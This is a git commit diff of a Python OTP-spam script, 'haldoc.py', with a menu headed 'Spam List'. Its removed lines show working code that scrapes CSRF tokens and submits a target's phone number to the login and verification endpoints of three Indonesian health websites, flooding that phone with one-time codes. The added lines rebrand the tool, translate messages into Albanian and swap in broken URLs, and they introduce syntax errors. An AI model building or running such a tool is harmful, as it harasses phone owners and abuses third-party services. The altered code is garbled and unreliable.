c77d0339b676369a7c2e8879f1ef9e6f31aea348
Scone-tech <75084404+scone-tech@users.noreply.github.com>
2020-12-02 00:25:08 +0100

    Update haldoc.py

--- haldoc.py
+++ haldoc.py
@@ -6,8 +6,8 @@ class docter:
 		self.ses=requests.Session()
 
 	def alodoc(self,num):
-		self.ses.headers.update({'referer':'https://www.alodokter.com/login-alodokter'})
-		req1=self.ses.get('https://www.alodokter.com/login-alodokter')
+		self.ses.headers.update({'instagram/scone_tech/login-scone_tech'})
+		req1=self.ses.get('instagram/scone_tech/login-scone_tech')
 		bs1=BS(req1.text,'html.parser')
 		token=bs1.find('meta',{'name':'csrf-token'})['content']
 #		print(token)
@@ -15,20 +15,20 @@ class docter:
 		head={
 			'user-agent':'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
 			'content-type':'application/json',
-			'referer':'https://www.alodokter.com/login-alodokter',
+			'referer':'https://instagram/scone_tech',
 			'accept':'application/json',
-			'origin':'https://www.alodokter.com',
+			'origin':'instagram/scone_tech',
 			'x-csrf-token':token
 		}
 		req2=self.ses.post('https://www.alodokter.com/login-with-phone-number',headers=head,json={"user":{"phone":num}})
 #		print(req2.json())
 		if req2.json()['status'] == 'success':
-			print("[•] Berhasil")
+			print("[•] Ishte e sukseshme")
 		else:
-			print("[-] Gagal")
+			print("[-] Deshtoi")
 
 	def klikdok(self,num):
-		req1=self.ses.get('https://m.klikdokter.com/users/create')
+		req1=self.ses.get('Scone-tech')
 		bs=BS(req1.text,'html.parser')
 		token=bs.find('input',{'name':'_token'})['value']
 #		print(token)
@@ -36,7 +36,7 @@ class docter:
 		head={
 			'Connection': 'keep-alive',
 			'Cache-Control': 'max-age=0',
-			'Origin': 'https://m.klikdokter.com',
+			'Origin': 'https:/instagran/scone_tech',
 			'Upgrade-Insecure-Requests': '1',
 			'Content-Type': 'application/x-www-form-urlencoded',
 			'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
@@ -45,9 +45,9 @@ class docter:
 		}
 		ata={
 			'_token':token,
-			'full_name':'BambangSubianto',
-			'email':'Hsjakaj@jskaka.com',
-			'phone':num,
+			'full_name':'Spamer',
+			'email':'ha',
+			'phone':num',
 			'back-to':'',
 			'submit':'Daftar',
 		}
@@ -55,30 +55,30 @@ class docter:
 		req2=self.ses.post('https://m.klikdokter.com/users/check',headers=head,data=ata)
 #		print(req2.url)
 		if "sessions/auth?user=" in req2.url:
-			print("[•] Berhasil")
+			print("[•] Ishte e sukseshme")
 		else:
-			print("[-] Gagal")
+			print("[-] Deshtoi")
 
 	def prosehat(self,num):
 		head={
 			'accept': 'application/json, text/javascript, */*; q=0.01',
-			'origin': 'https://www.prosehat.com',
+			'origin': 'scone-tech',
 			'x-requested-with': 'XMLHttpRequest',
 			'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
 			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-			'referer': 'https://www.prosehat.com/akun',
+			'referer': 'scone-tech',
 		}
 		ata={'phone_or_email':num,'action':'ajaxverificationsend'}
 
 #		print(req.text)
 		if "token" in req.text:
-			print("[•] Berhasil")
+			print("[•] Ishte e sukseshme")
 			for x in range(60):
 				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
 				time.sleep(1)
 			print()
 		else:
-			print(f"[-] Gagal {req.text}")
+			print(f"[-] Deshtoi {req.text}")
 			for x in range(60):
 				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
 				time.sleep(1)
@@ -91,9 +91,9 @@ while True:
 		[ Tanya Dokter OTP ]
 		 - By ALBANIAN-SECURITY -
 [ Spam List ]
-1. Alodokter.com
-2. Klikdokter.com
-3. Prosehat.com
+1. Sms
+2. Thirja 
+3. Scone-Tech
 	""")
 		zgj=int(input("> Zgjedh: "))
 		print("="*25)
